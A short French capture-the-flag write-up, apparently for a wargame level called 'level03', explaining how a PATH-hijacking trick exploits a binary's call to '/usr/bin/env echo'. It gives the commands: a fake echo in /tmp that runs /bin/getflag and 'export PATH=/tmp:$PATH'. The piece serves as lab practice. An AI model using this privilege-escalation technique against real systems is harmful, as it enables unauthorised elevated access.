@@ -1,0 +1,10 @@
+Executer le fichier level03: Exploit me
+strings sur fichier level03, on remarque la ligne : "/usr/bin/env echo Exploit me".
+
+On a décidé d'exploiter la commande echo pour exécuter "/bin/getflag".
+Pour cela, on crée un "fake" echo créé où l'on veut, on modifie la variable PATH de l'env pour mettre en premier le dossier où est situé notre "fake" echo
+
+"fake" echo: echo `/bin/getflag`
+modifier l'env: export PATH=/tmp:$PATH
+
+./level03 qui nous donne le flag.
